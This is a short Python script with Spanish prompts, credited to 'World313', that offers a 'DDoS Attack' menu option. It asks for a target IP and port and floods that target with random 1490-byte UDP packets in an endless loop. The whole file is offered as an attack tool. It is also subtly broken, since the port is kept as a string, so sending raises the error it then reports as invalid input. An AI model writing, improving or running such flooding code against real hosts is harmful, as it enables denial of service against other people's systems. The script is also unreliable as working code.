#Code by World313 (CalledLeader551)
from os import system
import socket
import random
import banner

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Start of the program
system('clear')
banner.banner()
print('\033[0;32m'+'\n\t\t\t   by World313\n\t\t\t[CalledLeader551]\n')
input('\033[0;33m'+'\t\t Presione Enter para continuar...')

#Menu
while True:

    system('clear')
    banner.menu()

    options = input('Input -> ').lower()
    #DDoS Attack
    if options=='1':
        system('clear')
        ip = input('\033[1;33m'+'IP del objetivo: '+'\033[1;32m')
        port = input('\033[1;33m'+'Puerto: '+'\033[1;32m')   
        
        #Packets counter
        sent = 0
        
        while True:
            try:
                sock.sendto(bytes, (ip,port))
                sent += 1
                print('\033[0;32m'+'Se enviaron '+'\033[0;31m'+f'{sent}'+'\033[0;32m'+' a '+'\033[0;31m'+f'{ip}'+'\033[0;32m'+' por el puerto: '+'\033[0;31m'+f'{port}')
                if port == 65534:
                    port = 1
            except TypeError:
                    print('\033[0;31m'+'\nLos valores ingresados no son validos\n')
                    input('\033[1;33m'+'\t\t Presione Enter para continuar...')
                    break
                
    #Close program
    elif options=='x':
        system('clear')
        print('Programa cerrado')
        break
    #Unknown character
    else:
        print('\033[0;31m'+f'El caracter "{options}" no existe\n')
        input('\033[1;33m'+'\t\t Presione Enter para continuar...')
